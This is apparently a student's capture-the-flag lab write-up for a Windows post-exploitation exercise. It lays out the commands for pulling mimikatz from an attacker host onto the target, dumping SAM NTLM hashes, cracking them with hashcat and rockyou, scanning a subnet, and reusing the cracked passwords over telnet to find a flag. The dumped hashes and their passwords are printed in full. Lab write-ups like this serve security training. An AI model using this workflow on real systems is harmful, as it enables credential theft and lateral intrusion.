# f9038f_hash_cracking

In the last cd699a challenge, we got the reverse shell.

Once we have access to the Windows system, we can dump secrets from the memory.

Check our privileges.
```
> whoami
nt authority\system  # we have system privileges
```

Download the mimikatz from the kali machine.
```
# kali machine
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
python3 -m http.server 8000


# target windows machine using curl
curl.exe -o m.zip http://192.168.0.7:8000/mimikatz_trunk.zip
mkdir m
tar -xf m.zip -C m

# target windows machine using powershell
powershell
$client = New-Object System.Net.WebClient
$client.DownloadFile("http://192.168.0.7:8000/mimikatz_trunk.zip", "C:\m.zip")
mkdir m
tar -xf m.zip -C m
```

Run the mimikatz to dump the secrets.
```
mimikatz # privilege::debug # escalate our privileges by letting a user to debug a process that they would normally not be allowed to 
mimikatz # log result.log # record the output to a file
mimikatz # lsadump::sam # dump the SAM database and NTLM
```

After that, we need to crack these hashes using `hashcat`, `john` or https://crackstation.net/.
```
# the result will be in ~/.local/share/hashcat/hashcat.potfile
hashcat -m 1000 -a 0 -O hash.txt /usr/share/wordlists/rockyou.txt  

# or we can specify the output file
hashcat -m 1000 -a 0 -O -o username_cracked.txt digest.txt /usr/share/wordlists/rockyou.txt  

```

Here is the result.
```
Domain : EN2720-W1-LAZAR
SysKey : 59e7a1c9940dab865bbab3c1bc73f4b4
User : Administrator
  Hash NTLM: b26f80138894f9d4803a0d5551db7e05
User : goldstein
  Hash NTLM: 11abdc9513314fca062737d7f7cf2555:brilliance
User : blade
  Hash NTLM: ae6426dabf7efc505246787eb6bcfdb3:nebbie
User : crash_override
  Hash NTLM: 452df09674d62ca8ca08ee3c4e196547:psychosocial
User : acid_burn
  Hash NTLM: d40c9663d248f741bce61c9fb97fcbbc:calvi
User : phantom_phreak
  Hash NTLM: 1895a0eee51ebcfc84b5fc328006a46e:chessmen
 User : mr_babbage
  Hash NTLM: 222314d436a3c01864ec11c50c8cf136:snark
 User : kate_libby
  Hash NTLM: adb35a66c317f149389bd2f360ef80b9:wingspan
User : hal
  Hash NTLM: 11b28f858ce373f370696e2eecdb9c93:sab
User : admin
  Hash NTLM: e84d037613721532e6b6d84d215854b6:1111
```

When we got the password, it is time to find the target. Usually, people use the same username and password in different machines.

For ssh, ftp, telnet, rdp, smb, we need password and username.
```
nmap -p 21 10.0.0.0/20 # ftp 10.0.3.197
nmap -p 22 10.0.0.0/20 # ssh 10.0.3.197, 10.0.3.206, 10.0.3.133, 10.0.2.197
nmap -p 23 10.0.0.0/20 # telnet 10.0.3.133, 10.0.2.204
nmap -p 3389 10.0.0.0/20 # rdp 10.0.3.197
nmap -p 445 10.0.0.0/20  # smb 10.0.3.197
```

Use hydra to brute force the telnet, everytime I got different result and it is not working. Why?
```
hydra -L users.txt -P password.txt telnet://10.0.3.133
```

After that, I tried to enter all the username and password manually to telnet. 
```
telnet 10.0.3.133
en2720-w1-sea-turtle login: blade
Password: nebbie

find / -type f -name "*flag{f90*" 2>/dev/null
/home/flag{f9038fcaf885cf45d99964167e9d4fc967b9a920e34f2e}.jpg

```
